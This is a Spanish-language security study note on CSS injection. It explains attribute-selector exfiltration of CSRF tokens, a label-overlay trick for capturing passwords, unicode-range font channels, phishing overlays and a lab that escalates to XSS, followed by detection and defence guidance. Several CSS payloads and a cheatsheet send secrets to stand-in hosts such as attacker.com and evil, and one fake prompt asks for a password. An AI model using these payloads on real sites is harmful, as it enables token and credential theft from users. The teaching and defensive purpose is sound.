---
aliases: ["CSSI", "CSS Injection", "Inyección CSS", "CSS Exfiltration"]
tags:
  - sec/web
  - sec/web/injection
  - sec/web/client-side
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Cross-Site Scripting XSS]]"
  - "[[Clickjacking Ataques]]"
  - "[[Client-Side Template Injection (CSTI)]]"
  - "[[Gestión de Autenticación]]"
  - "[[Information disclosure]]"
fuente: "https://portswigger.net/web-security/cross-site-scripting#can-i-run-javascript-in-css"
---

# Inyecciones CSS (CSSI)

Las **Inyecciones CSS** (**CSSI**) son un tipo de vulnerabilidad web que permite a un atacante inyectar CSS malicioso en una página web. Esto ocurre cuando una aplicación confía en entradas no confiables y las usa directamente en una hoja de estilo o en un atributo `style`, sin validarlas. A diferencia de [[Cross-Site Scripting XSS]], CSS **no ejecuta JavaScript** en navegadores modernos — su poder ofensivo está en el **estilado controlado del DOM ajeno** y en la **exfiltración de datos por selectores CSS**.

> [!info] Mecanismo de Inyección CSS
> Una Inyección CSS se produce cuando la entrada del usuario no se sanea o escapa correctamente antes de ser incrustada en una hoja de estilo CSS o en un atributo `style` dentro del HTML. Esto permite al atacante cerrar la declaración CSS existente e introducir sus propias reglas CSS arbitrarias.

El código CSS malicioso inyectado puede alterar el estilo y diseño de la página, permitiendo a los atacantes realizar acciones como la **suplantación de identidad** (phishing) o el **robo de información confidencial**.

> [!warning] Corrección técnica importante: CSS no ejecuta JavaScript (hoy)
> Textos antiguos (y notas previas de este vault) describen la "CSS-Induced JavaScript Injection". La realidad actual: `expression()` es exclusivo de Internet Explorer (muerto), `-moz-binding`/XBL fue eliminado de Firefox, `behavior:` es IE, y las URLs `javascript:` en `background-image`/`list-style-image` **no se ejecutan** en ningún navegador moderno. El pipeline de riesgo real de CSSI es:
> 1. **Exfiltración de datos** por selectores de atributo + recursos externos (el ataque principal, ver abajo).
> 2. **UI redress / phishing** por estilado del DOM ajeno (ocultar, superponer, reescribir visualmente).
> 3. **XSS solo como secundaria**: si el CSS inyectado logra influir en el *markup* posterior (p. ej. combinándose con otro bug de template) o si la app mete el input en un contexto HTML además del CSS. El XSS del laboratorio de abajo se logró porque el input del color no estaba *tampoco* escapado para contexto HTML, no porque CSS ejecute JS.
> Ver [[Cross-Site Scripting XSS]] para el vector JS real y [[Clickjacking Ataques]] para la variante de superposición con iframes.

## Mecánica: cómo el navegador aplica CSS inyectado

CSS es declarativo y **se aplica a todo el documento**, no solo al elemento donde fue inyectado. Un atacante que controla una regla puede:

| Capacidad del selector/propiedad | Abuso |
|---|---|
| Seleccionar **cualquier elemento** del DOM (incluso `input[value]`, `meta`, `link`) | Oráculo de contenido carácter a carácter |
| Cargar recursos externos: `url()`, `@import`, `@font-face`, `image-set()` | **Exfiltración**: el resource request viaja al servidor del atacante |
| Cambiar layout/visibilidad (`display`, `opacity`, `position`, `z-index`) | Ocultar banners, superponer forms falsos, rediseñar la página |
| Animaciones y eventos de estado (`:hover`, `:checked`, `@keyframes`) | Detectar interacción, auto-scroll del victim |
| Fuentes con ligaduras (`font-feature-settings`) | Canal de exfiltración por el ancho del glyph renderizado |

Contextos donde se puede inyectar:

```
<style> ... attacker CSS ... </style>     # inyección en bloque de estilo (la más potente)
<div style="color: ATTACKER">             # atributo style (limitado a propiedades, sin selectores)
@import 'https://evil/evil.css';          # si controlas una hoja importada
svg <style>...</style>                    # CSS dentro de SVG
```

En atributo `style` el alcance es el elemento: sirve para estilado (UI redress) pero **no** para exfiltración por selector (necesitas reglas con selectores propios).

## Ataque principal: exfiltración de datos con selectores de atributo

La técnica (terjanq / Gareth Heyes, "CSS injection attacks"): si la página refleja un valor secreto en el DOM — `value` de un input (CSRF token, número de tarjeta), texto, `href` — puedes adivinarlo carácter a carácter con selectores y hacer que el navegador **pida tu servidor** cuando aciertes:

```css
/* El navegador busca un input cuyo valor empiece con "a" ... */
input[name=csrf][value^="a"] {
  background: url(https://attacker.com/exfil?char=a);
}
/* ... y prueba todos los caracteres en paralelo */
input[name=csrf][value^="b"] { background: url(https://attacker.com/exfil?char=b); }
input[name=csrf][value^="c"] { background: url(https://attacker.com/exfil?char=c); }
/* siguiente carácter: [value^="a0"], [value^="a1"], ... (búsqueda por prefijos) */
```

Para **passwords reales** (campo `type=password` no refleja `value` en el DOM) se usa el truco del **label overlay**: cubres el campo con un `<label>` transparente; cuando el usuario teclea, cada tecla escribe dentro del label, que sí es seleccionable:

```css
/* Simplificación del patrón label-overlay */
input[type=password] + label { position: relative; }
label { font: 20px monospace; position: absolute; inset: 0; opacity: 0.01; }
label[value^="s"] { background: url(https://attacker.com/k?s); }
```

### Mejoras modernas del canal

| Técnica | Mecanica | Ventaja |
|---|---|---|
| **Unicode-range** | `@font-face` con `unicode-range: U+61` (la 'a') carga un font distinto por carácter | Una sola petición de fuente adivina el carácter renderizado; reduce drasticamente el volumen de requests |
| **Ligaduras (dactylography)** | Fuente con ligadura `st` → si el texto contiene "st" el ancho cambia | Exfiltra *presencia de substrings* en texto plano visible |
| **Scroll/interacción** | `:hover`, animación con `animation-timeline: scroll()`, `@keyframes` que mueven contenido hacia tu URL | Auto-scroll de la víctima o detección de que leyó la sección |
| **`@import` diferido** | Cargas tu hoja con los 256 selectores de un charset completo | Reduce el tamaño del payload inyectado |

> [!tip] Escala del ataque
> Cada carácter cuesta ~50-100 requests (un charset). Un token de 32 caracteres son miles de peticiones — viable porque son **el navegador de la víctima** las que viajan, sin rate limit de la app. Con unicode-range se reduce a ~1 petición por carácter adivinado.

## UI redress y phishing con CSS

Sin exfiltración, el CSS inyectado reescribe visualmente la página:

- **Overlay de login**: `position: fixed; inset: 0` con un form falso encima del real (credential harvesting sin [[Clickjacking Ataques]] ni iframe).
- **Ocultar avisos**: `display: none` sobre banners de cookies/advertencias.
- **Reescribir links visuales**: `::before { content: "https://banco-seguro.evil" }` sobre un link cuyo `href` real es otro (visual ≠ DOM para el usuario; para el lector de pantalla y para copiar-pegar manda el DOM — engaño solo visual).
- **Exfiltrar vía clicks**: hacer que un botón inofensivo cubra visualmente a otro (`z-index`), redirigiendo la acción del usuario.

## Laboratorios y notas prácticas

Tenemos esta web, donde si ponemos el color nos lo representa:

![[Pasted image 20260227172723.png]]

![[Pasted image 20260227172746.png]]

Si revisamos el código fuente:

![[Pasted image 20260227172824.png]]

Nosotros controlamos cómo funciona el estilo — el valor del color se interpola directamente en el atributo `style`:

```html
<!-- El input del usuario queda SIN escapar dentro del estilo -->
<div style="color: USUARIO; background: white;">
```

Podemos derivar esto a un [[Cross-Site Scripting XSS]] rompiendo el contexto del atributo y cerrando la etiqueta (el input no estaba escapado para contexto HTML):

![[Pasted image 20260227172928.png]]

![[Pasted image 20260227172933.png]]

> [!info] Lectura del lab
> El color `red;"><script>...</script>` cerró el atributo `style`, luego el tag `<div>` y abrió un `<script>`. La lección: **todo input que llega al HTML debe escaparse para su contexto exacto** (atributo, texto, CSS, URL). Si el input hubiera estado correctamente escapado para atributo, el resultado sería CSSI puro (cambio de estilo), no XSS.

### Escenarios típicos de laboratorio (PortSwigger CSS labs)

| Escenario | Contexto | Impacto esperado |
|---|---|---|
| Input reflejado en `style="color: X"` | Atributo, no selector | Cambio de estilo / derivación a XSS si no hay escape HTML (el lab de arriba) |
| Input almacenado dentro de `<style>` de la página | Bloque de estilo completo | Reglas con selectores → exfiltración de tokens del DOM |
| Tema personalizable guardado como CSS | Hoja servida como stylesheet | Igual que el anterior, persistente |
| Comentario con CSS escapado parcialmente | Texto con `<style>` permitido | Inyección de reglas en página pública |

### Catálogo de selectores de exfiltración

```css
/* Prefijo de valor (token, número de tarjeta, campo oculto) */
input[value^="a"] { background: url(https://evil/?0_a) }
input[value*="@"] { background: url(https://evil/?contiene_arroba) }

/* Atributos de enlaces y meta */
a[href^="https://internal"] { background: url(https://evil/?link_interno) }
meta[content^="csrf"] { background: url(https://evil/?meta) }

/* Texto visible (párrafos, comentarios, celdas de tabla) */
body:is(p:has-text?)  /* :has-text no existe en CSS estándar: se usa el truco del label o fuentes */

/* Ocultar/reemplazar UI */
#aviso-cookies { display: none }
#login-form::before { content: "Sesión expirada, reintroduce tu contraseña"; }
```

## Detección

| Señal | Indicador |
|---|---|
| Input reflejado dentro de `<style>` o `style="..."` sin escape de `"\;}{` | Superficie CSSI directa |
| Diferencia de rendering al inyectar `color:red` | El navegador aplica tus reglas |
| Requests del navegador a tu servidor tras inyectar selectores + `url()` | Exfiltración funcionando |
| `</style>` reflejado literalmente | Puedes inyectar reglas completas con selectores |

Payload de prueba canónico: `red; background-image: url(https://TU-SERVER/x)` — si tu servidor recibe `/x` al cargar la página, hay inyección aplicable.

## Impacto

- **Exfiltración de tokens/PII/credenciales** del DOM (CSRF tokens, campos ocultos, texto visible) → encadena con [[Cross-Site Request Forgery (CSRF)]] o robo de sesión.
- **Credential harvesting** por overlay de login.
- **Defacement/engañ**o visual a escala de página completa.
- **XSS** solo cuando el input no está escapado para ningún contexto (como el lab) → impacto total de [[Cross-Site Scripting XSS]].

## Defensa

### 1. Escapado por contexto (la defensa raíz)

```php
<!-- ❌ Interpolación directa en estilo -->
<div style="color: <?= $_GET['color'] ?>;">

<!-- ✅ Solo valores de una allowlist de colores validados en servidor -->
<?php $allowed = ['red','blue','#0af', '#123456'];
      $color = in_array($_GET['color'], $allowed, true) ? $_GET['color'] : 'black'; ?>
<div style="color: <?= htmlspecialchars($color, ENT_QUOTES) ?>;">
```

```python
# ✅ Escape correcto para contexto de atributo/CSS (además de allowlist)
import html, re
def css_safe(value: str) -> str:
    if not re.fullmatch(r"[a-zA-Z0-9 #(),.%-]+", value):   # charset estricto
        raise ValueError("valor CSS no permitido")
    return html.escape(value, quote=True)   # " y ' escapadas
```

### 2. CSP que neutraliza la exfiltración

```http
Content-Security-Policy:
  default-src 'self';
  style-src 'self' 'unsafe-inline';   # o nonce/hash en vez de unsafe-inline
  font-src 'self';
  connect-src 'self';                 # bloquea url() a dominios del atacante
  img-src 'self' data:;
```

> [!warning] `'unsafe-inline'` en `style-src` limita pero no mata todo
> Sigue permitiendo inyección de estilos inline (UI redress); lo que corta la exfiltración es restringir `img-src`/`font-src`/`connect-src`/`default-src` a orígenes propios. Ideal: nonce por request para los `<style>` legítimos.

### 3. Sanitización de HTML (si el input puede alcanzar el marcado)

```javascript
// ✅ Si el input de usuario puede contener tags: sanitizar con allowlist
// (SANITIZE: los selectores y valores del style de usuario deben pasar por allowlist)
DOMPurify.sanitize(input, { FORBID_TAGS: ['style','link','meta'], FORBID_ATTR: ['style'] });
```

### 4. Separar datos de presentación

Los valores de usuario deben ser texto, nunca CSS parcial: template engines que escapan por defecto (Jinja2 `{{ }}`, React `{}`), y estilos movidos a clases definidas en hojas propias.

## Errores comunes

**Atacante:**
- Creer que CSSI = XSS: en navegadores modernos no ejecutas JS; tu impacto real es exfiltración o UI redress — mide y reporta eso.
- Inyectar 256 selectores sin comprobar primero si `url()` externo está permitido por CSP; haz un canario a tu servidor antes de escalar.
- Olvidar el `label overlay` cuando el campo es `password` (no puedes leer `value` de un input password por selector).
- Exfiltrar sin límite de requests y disparar detección por volumen.

**Defensor:**
- Escapar solo `<`, `>` y dejar comillas sin escapar en atributos `style` (rompe el atributo con `"`).
- Asumir que "solo es un color" y concatenar input en CSS.
- Confiar en CSP sin revisar `style-src 'unsafe-inline'` + `img-src *`.
- Dejar que usuarios envíen hojas CSS completas (temas personalizados) sin sanitizar selectores/propiedades.

## Cheatsheet

```
# Canary de exfiltración (verify primero)
color: red; background-image: url(https://TU-SERVER/canario)

# Inyección en bloque <style>
</style>
input[name=csrf][value^="a"] { background: url(https://evil/a) }
# (replicar por cada carácter del charset; siguiente prefijo por cada acierto)

# Label overlay para passwords (patrón)
#  <label> transparente cubriendo el input password + selectores value^

# Unicode-range (1 request por carácter)
@font-face { font-family: x; src: url(https://evil/a) format('woff2'); unicode-range: U+61; }

# UI redress
#  position: fixed + overlay de form falso / display:none sobre avisos

# Escapado de prueba para contexto style attribute
#  romper con:  "><script>alert(1)</script>   (verifica si hay XSS por contexto)
```

## Referencias

- PortSwigger — Can I run JavaScript in CSS?: https://portswigger.net/web-security/cross-site-scripting#can-i-run-javascript-in-css
- PortSwigger Research — Stealing data using CSS injection: https://portswigger.net/research/stealing-data-using-css-injection
- terjanq — The Leaky Web / CSS exfiltration: https://terjanq.github.io/
- OWASP — HTML attribute escape rules: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- Related internals: [[Cross-Site Scripting XSS]] · [[Clickjacking Ataques]] · [[Client-Side Template Injection (CSTI)]] · [[Cross-Site Request Forgery (CSRF)]] · [[Gestión de Autenticación]]
